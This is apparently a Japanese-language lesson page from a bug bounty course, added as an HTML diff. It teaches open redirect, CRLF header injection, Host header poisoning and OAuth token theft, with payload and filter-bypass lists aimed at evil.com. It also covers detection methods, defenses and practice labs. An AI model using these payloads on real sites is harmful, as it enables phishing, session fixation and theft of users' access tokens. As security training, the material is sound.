@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Open Redirect & Header Injection - Bug Bounty Learning Path</title>
+    <link rel="stylesheet" href="../assets/style.css">
+    <style>
+        .complete-btn { display:inline-block; padding:0.5rem 1.2rem; border:1px solid var(--green); border-radius:6px; background:transparent; color:var(--green); cursor:pointer; font-size:0.85rem; transition:all 0.2s; }
+        .complete-btn:hover { background:var(--green); color:#000; }
+        .complete-btn.is-complete { background:var(--green); color:#000; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="../index.html">Top</a> &gt; Phase 1: Core Vulnerabilities &gt; Open Redirect &amp; Header Injection
+        </div>
+
+        <div class="page-header">
+            <h1>Open Redirect &amp; Header Injection</h1>
+            <p class="subtitle">
+                リダイレクト先やHTTPヘッダーを操作し、フィッシング・トークン窃取・キャッシュポイズニングを実現する。
+                単体では Low 評価だが、OAuth チェーンで Critical に昇格可能。
+            </p>
+            <div style="margin-top:1rem;">
+                <span class="tag tag-theory">Theory</span>
+                <span class="tag tag-wsa">WSA Lab</span>
+                <span class="tag tag-handson">Hands-on</span>
+                <span class="tag tag-casestudy">Case Study</span>
+            </div>
+        </div>
+
+        <!-- 原理 -->
+        <div class="section">
+            <h2>原理と仕組み</h2>
+            <p>
+                Open Redirect は、アプリケーションがユーザー入力をリダイレクト先として使用する際に、
+                外部ドメインへのリダイレクトを許可してしまう脆弱性。
+                CRLF / Header Injection は、HTTPレスポンスヘッダーにユーザー入力を注入する。
+            </p>
+
+            <div class="callout">
+                <div class="callout-title">BB における評価</div>
+                <p>
+                    Open Redirect 単体は多くのプログラムで <strong>Low / Informational / Out of Scope</strong>。
+                    しかし以下のチェーンで severity が大幅に上がる:
+                </p>
+                <ul>
+                    <li>OAuth redirect_uri hijack → Access Token 窃取 (Critical)</li>
+                    <li>SSO フローでの token leakage</li>
+                    <li>SSRF フィルタのバイパス</li>
+                    <li>Referer 経由でのトークン漏洩</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- 種類 -->
+        <div class="section">
+            <h2>種類と分類</h2>
+
+            <h3>1. Open Redirect テクニック</h3>
+<pre><code>// 基本形
+https://target.com/redirect?url=https://evil.com
+
+// プロトコル相対URL
+//evil.com
+\/\/evil.com
+/\/evil.com
+
+// バックスラッシュ
+https://target.com/redirect?url=https://evil.com\@target.com
+https://target.com/redirect?url=//evil.com\
+
+// URL エンコーディング
+%2f%2fevil.com
+%252f%252fevil.com  // double encode
+
+// @ トリック (Basic Auth 構文)
+https://target.com@evil.com
+https://target.com%40evil.com
+
+// ドメインの一部一致バイパス
+// フィルタ: url must contain "target.com"
+https://target.com.evil.com
+https://evil.com/target.com
+https://evil.com?target.com
+
+// null byte / fragment
+https://evil.com%00.target.com
+https://target.com#@evil.com
+
+// data URI
+data:text/html,&lt;script&gt;location='https://evil.com'&lt;/script&gt;
+
+// JavaScript URI (一部環境)
+javascript:location='https://evil.com'</code></pre>
+
+            <h3>2. CRLF Injection (Header Injection)</h3>
+            <p>
+                HTTP レスポンスヘッダーに CR LF (%0d%0a) を注入し、
+                新しいヘッダーや body を追加する。
+            </p>
+<pre><code>// 基本
+GET /page?lang=en%0d%0aInjected-Header:%20value HTTP/1.1
+
+// レスポンス:
+HTTP/1.1 302 Found
+Location: /page?lang=en
+Injected-Header: value
+
+// XSS への昇格 (body 注入)
+GET /page?param=value%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;
+
+// Set-Cookie 注入 (セッション固定)
+GET /page?param=x%0d%0aSet-Cookie:%20session=attacker_session
+
+// エンコーディングバリエーション
+%0d%0a        // CRLF
+%0a           // LF only (一部サーバーで有効)
+%E5%98%8A%E5%98%8D  // UTF-8 encoded CRLF (Unicode normalization)</code></pre>
+
+            <h3>3. Host Header Attacks</h3>
+<pre><code>// Password Reset Poisoning
+POST /forgot-password HTTP/1.1
+Host: evil.com
+
+// リセットメールのリンク: https://evil.com/reset?token=abc123
+// 被害者がクリック → トークンが攻撃者に送信
+
+// X-Forwarded-Host
+POST /forgot-password HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+
+// Web Cache Poisoning
+GET /static/main.js HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+
+// キャッシュキーに Host が含まれない場合:
+// CDN が evil.com のコンテンツをキャッシュ → 他ユーザーに配信
+
+// Routing-based SSRF
+GET /internal-api HTTP/1.1
+Host: internal.target.com
+// ロードバランサーが Host ヘッダーでルーティング先を決定</code></pre>
+
+            <h3>4. OAuth Token Theft via Open Redirect</h3>
+<pre><code>// OAuth フロー:
+// 1. ユーザーが認可サーバーにアクセス
+// 2. 認可後、redirect_uri にトークンが付いてリダイレクト
+
+// 攻撃:
+// redirect_uri の検証が不十分な場合:
+https://auth.target.com/authorize?
+  client_id=app&
+  redirect_uri=https://target.com/callback/../redirect?url=https://evil.com&
+  response_type=token
+
+// トークンが evil.com に送信される:
+// https://evil.com#access_token=leaked_token
+
+// redirect_uri バイパスパターン:
+redirect_uri=https://target.com.evil.com
+redirect_uri=https://target.com%40evil.com
+redirect_uri=https://target.com/callback/../../other-page
+redirect_uri=https://target.com/callback?next=https://evil.com</code></pre>
+        </div>
+
+        <!-- 検出方法 -->
+        <div class="section">
+            <h2>検出方法</h2>
+            <table>
+                <thead>
+                    <tr><th>テスト対象</th><th>方法</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>リダイレクトパラメータ</td><td>url=, next=, redirect=, return=, continue= を探す</td></tr>
+                    <tr><td>302/301 レスポンス</td><td>Location ヘッダーにユーザー入力が反映されるか</td></tr>
+                    <tr><td>JavaScript リダイレクト</td><td>window.location, document.location への入力反映</td></tr>
+                    <tr><td>Meta refresh</td><td>meta タグの URL にユーザー入力が含まれるか</td></tr>
+                    <tr><td>CRLF</td><td>パラメータに %0d%0a を注入してヘッダー確認</td></tr>
+                    <tr><td>Host Header</td><td>X-Forwarded-Host でレスポンス変化確認</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- mei-bb reference -->
+        <div class="section">
+            <h2>実体験: OPPO Open Redirect (dup)</h2>
+            <div class="card">
+                <div class="card-title">drp.myoppo.com - Open Redirect via state parameter</div>
+                <p>
+                    OPPOのデバイスリカバリポータルで、OAuth の <code>state</code> パラメータに
+                    リダイレクト先 URL がエンコードされており、攻撃者が任意の外部 URL を指定可能だった。
+                </p>
+                <p>
+                    結果: <strong>Duplicate</strong> (既に報告済み)。Open redirect 単体としての報告だが、
+                    OAuth トークンの leakage と組み合わせればより高い severity を主張できた可能性がある。
+                </p>
+                <p class="annotation">
+                    教訓: Open redirect を見つけたら、単体で報告せず OAuth/SSO チェーンを先に探索する。
+                </p>
+            </div>
+        </div>
+
+        <!-- 防御と Bypass -->
+        <div class="section">
+            <h2>防御と Bypass</h2>
+
+            <h3>防御策</h3>
+            <ul>
+                <li><strong>ホワイトリスト方式</strong>: 許可するドメインを明示的に列挙</li>
+                <li><strong>相対パスのみ許可</strong>: 外部 URL を完全に禁止</li>
+                <li><strong>リダイレクトマップ</strong>: URL ではなく ID で管理 (redirect_id=3)</li>
+                <li><strong>ユーザー確認画面</strong>: 「外部サイトに移動します」の警告表示</li>
+            </ul>
+
+            <h3>フィルタ Bypass パターン集</h3>
+<pre><code>// ドメインホワイトリスト bypass
+// 検証: url.startswith("https://target.com")
+https://target.com.evil.com
+https://target.com@evil.com
+https://target.com%23@evil.com
+
+// 検証: url.endswith("target.com")
+https://evil-target.com
+https://eviltarget.com
+
+// 検証: "target.com" in url
+https://evil.com/target.com
+https://evil.com?q=target.com
+
+// プロトコル検証 bypass
+// 検証: url.startswith("http")
+http://evil.com
+https://evil.com
+
+// Path 検証 bypass
+// 検証: url starts with /
+/\/evil.com
+/\evil.com
+/%09/evil.com</code></pre>
+        </div>
+
+        <!-- Practice -->
+        <div class="section">
+            <h2>Practice (WSA Labs)</h2>
+            <h3>PortSwigger Web Security Academy</h3>
+            <ul>
+                <li><a href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter" target="_blank">Lab: SSRF with whitelist-based input filter (URL parsing)</a></li>
+                <li><a href="https://portswigger.net/web-security/host-header/exploiting/lab-host-header-basic-password-reset-poisoning" target="_blank">Lab: Basic password reset poisoning via Host header</a></li>
+                <li><a href="https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests" target="_blank">Lab: Web cache poisoning via ambiguous requests</a></li>
+                <li><a href="https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect" target="_blank">Lab: Stealing OAuth access tokens via open redirect</a></li>
+            </ul>
+        </div>
+
+        <!-- Key Takeaways -->
+        <div class="section">
+            <h2>Key Takeaways</h2>
+            <div class="card">
+                <ul>
+                    <li><strong>Open Redirect 単体は Low</strong>: チェーン価値を常に探す (OAuth, SSRF bypass)</li>
+                    <li><strong>OAuth redirect_uri が最大の prize</strong>: Access token 窃取で Critical に</li>
+                    <li><strong>Host Header は多目的</strong>: Password reset, Cache poison, SSRF に使える</li>
+                    <li><strong>CRLF は過去の遺物ではない</strong>: 特にレガシーシステムやプロキシ経由で健在</li>
+                    <li><strong>bypass テクニックを系統的に試す</strong>: encoding, backslash, @, fragment を全網羅</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- References -->
+        <div class="section">
+            <h2>References</h2>
+            <ul>
+                <li><a href="https://portswigger.net/web-security/host-header" target="_blank">PortSwigger - HTTP Host Header Attacks</a></li>
+                <li><a href="https://portswigger.net/web-security/oauth" target="_blank">PortSwigger - OAuth Attacks</a></li>
+                <li><a href="https://book.hacktricks.xyz/pentesting-web/open-redirect" target="_blank">HackTricks - Open Redirect</a></li>
+                <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect" target="_blank">PayloadsAllTheThings - Open Redirect</a></li>
+                <li><a href="https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a" target="_blank">HackTricks - CRLF Injection</a></li>
+            </ul>
+        </div>
+
+        <!-- Complete Button -->
+        <div style="text-align:center; margin:2rem 0;">
+            <button class="complete-btn" data-module-id="1a-redir" onclick="toggleComplete('1a-redir')">Mark Complete</button>
+        </div>
+
+        <!-- Page Nav -->
+        <div class="page-nav">
+            <a href="19-business-logic.html">&larr; Prev: Business Logic</a>
+            <a href="1b-cors-misconfig.html">Next: CORS Misconfig &rarr;</a>
+        </div>
+    </div>
+    <script src="../assets/progress.js"></script>
+</body>
+</html>
